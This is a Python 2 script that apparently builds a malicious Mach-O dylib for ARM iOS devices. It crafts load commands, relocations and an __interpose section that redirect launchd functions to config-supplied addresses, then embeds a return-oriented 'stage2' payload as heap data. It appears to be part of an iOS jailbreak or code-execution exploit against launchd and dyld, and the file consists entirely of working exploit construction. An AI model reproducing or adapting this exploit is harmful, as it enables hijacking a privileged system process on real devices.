#!/opt/local/bin/python2.6
import struct, sys, os
import warnings
warnings.simplefilter('error')
debug_mode = False

import config
cfg = config.openconfig()
arch = cfg['arch']
launchd = cfg['#launchd']
assert arch in ['armv6', 'armv7']
def nexti(addr):
    if addr & 1:
        addr += 2
    else:
        addr += 4
    return addr
myreps = {
    '_getpid':                   launchd['-1'],
    '_unsetenv':                 launchd['0'],
    '_launch_data_new_errno':    launchd['1'],
    '_setrlimit':                launchd['2'],
    '__exit':                    launchd['3'],
    '_audit_token_to_au32':      launchd['4'],
    '_launch_data_unpack':       launchd['5'],
    '_launch_data_dict_iterate': launchd['6'],
}

imports = sorted(myreps.keys() + ['__mh_execute_header'])

beforesize = 0x8000
heapaddr = 0x11130000
baseaddr = heapaddr - beforesize

relocs = []
dontcare = 0

import zero
heap = zero.make_stage2(['R4', 'R5', 'R6', 'R7', 'PC'], True, heapaddr)

assert len(heap) < 0x1654
heap += '\0' * (0x1654 - len(heap))
heap += struct.pack('IIII', dontcare, dontcare, heapaddr + 0xc, launchd['7'])

heapsize = len(heap)

for k, v in myreps.items():
    relocs.append((heapaddr + len(heap) + 4, k))
    heap += struct.pack('II', v, 0)

strings = '\0' + '\0'.join(sorted(imports)) + '\0'
fp = open('one.dylib', 'wb')
OFF = 0
def f(x):
    global OFF
    if isinstance(x, basestring):
        fp.write(x)
        OFF += len(x)
    else:
        fp.write(struct.pack('I', x))
        OFF += 4

lc_size = 0x7c + 0x50 + 0x18 # size of load commands

f(0xfeedface) # magic
if arch == 'armv6':
    f(12) # CPU_TYPE_ARM
    f(6) # CPU_SUBTYPE_ARM_V6
elif arch == 'armv7':
    f(12) # CPU_TYPE_ARM
    f(9) # CPU_SUBTYPE_ARM_V7
elif arch == 'i386':
    f(7)
    f(3)
f(6) # MH_DYLIB
f(6) # number of load commands
f(123) # overwrite this
# flags: MH_FORCE_FLAT | MH_DYLDLINK | MH_PREBOUND
f(0x100 | 0x4 | 0x10)

# Load commands
# linkedit!
# LC_SEGMENT
f(1)
f(56)
f('__LINKEDIT' + '\0'*6)
ohcrap = OFF
f(baseaddr) # vmaddr
f(0x1000) # vmsize
f(0) # fileoff
f(0x1000) # filesize
f(3) # maxprot
f(3) # initprot
f(0) # no sections
f(0) # flags=0

# ...now that ohcrap is set...
relocs.append((baseaddr + ohcrap, '__mh_execute_header'))
relocs.append((baseaddr + ohcrap + 4, '_getpid'))


# LC_SEGMENT
f(1) 
f(56 + 68)
f('__TEXT' + '\0'*10)
f(baseaddr+0x1000) # vmaddr
f(beforesize - 0x1000) # vmsize
f(0x1000) # fileoff
linky = OFF
f(0x1000) # filesize
f(3) # maxprot = VM_PROT_READ | VM_PROT_WRITE
f(3) # initprot = VM_PROT_READ | VM_PROT_WRITE
f(1) # 2 sections
f(0) # flags=0

# Section 1
f('__text' + '\0'*10)
f('__TEXT' + '\0'*10)
f(baseaddr+0x1000) # address
f(0x1000) # size
f(0x1000) # off
f(0) # align
f(0x1000) # reloff
f(len(relocs)) # nreloc
f(0) # flags
f(0) # reserved1
f(0) # reserved2

# LC_SEGMENT
f(1) 
f(56 + 2*68)
f('__DATA' + '\0'*10)
f(heapaddr) # vmaddr
f(0x2000) # vmsize
f(0x2000) # fileoff
linky2 = OFF
f(0x2000) # filesize
f(3) # maxprot = VM_PROT_READ | VM_PROT_WRITE
f(3) # initprot = VM_PROT_READ | VM_PROT_WRITE
f(2) # 2 sections
f(0) # flags=0

# Section 1
f('__heap' + '\0'*10)
f('__DATA' + '\0'*10)
f(heapaddr) # address
split1 = OFF
f(0xbeef) # size
f(0x2000) # off
f(0) # align
f(0) # reloff
f(0) # nreloc
f(0) # flags
f(0) # reserved1
f(0) # reserved2

# Section 2
f('__interpose' + '\0'*5)
f('__DATA' + '\0'*10)
split2 = OFF
f(0xbeef) # address
f(0xbeef) # size
f(0xbeef) # off
f(0) # align
f(0) # reloff
f(0) # nreloc
f(0) # flags
f(0) # reserved1
f(0) # reserved2

f(0xc) # LC_LOAD_DYLIB
path = 'libSystem.dylib'
while len(path) % 4 != 0: path += '\x00'
f(6*4 + len(path))
f(24)
f(0) # timestamp
f(0) # version
f(0) # version
f(path)

f(2) # LC_SYMTAB
f(4*6)
f(0x1000 + 8*len(relocs)) # symbol table offset
f(len(imports)) # nsyms
stringy = OFF
f(0) # stroff
f(len(strings)) # strsize

# dyld crashes without this
f(0xb) # LC_DYSYMTAB
f(0x50)
f(0); f(0) # local
f(len(imports)); f(0) # extdef
f(0); f(0) # undef
f(0); f(0) # toc
f(0); f(0) # modtab
f(0); f(0) # extrefsym
f(0); f(0) # indirectsym
f(0x1000); f(len(relocs)) # extrel
f(0); f(0) # locrel

fp.seek(0x14)
fp.write(struct.pack('I', OFF - 0x1c))
fp.seek(OFF)



fp.seek(0x1000) # __TEXT
OFF = 0x1000

# Relocations
for addr, new in relocs:
    f(addr - baseaddr)
    f(0x0c000000 | imports.index(new))

# Symbol table - undefined
for imp in imports:
    f(strings.find('\0'+imp+'\0') + 1)
    f('\x01') # n_type
    f('\x00') # n_sect 
    f('\x00\x00')
    if imp == '__mh_execute_header':
        f(baseaddr + ohcrap) # n_value
    else:
        f(0) # n_value


fp.seek(stringy)
fp.write(struct.pack('I', OFF))
fp.seek(OFF)
f(strings)


fp.seek(0x2000)
OFF = 0x2000
fp.write(heap)

assert fp.tell() < 0x4000
OFF = fp.tell()

fp.seek(split1)
fp.write(struct.pack('I', heapsize))
fp.seek(split2)
fp.write(struct.pack('III', heapaddr + heapsize, 8*len(myreps), 0x2000 + heapsize))
fp.seek(linky)
fp.write(struct.pack('I', OFF - 0x1000))
fp.seek(linky2)
fp.write(struct.pack('I', OFF - 0x2000))

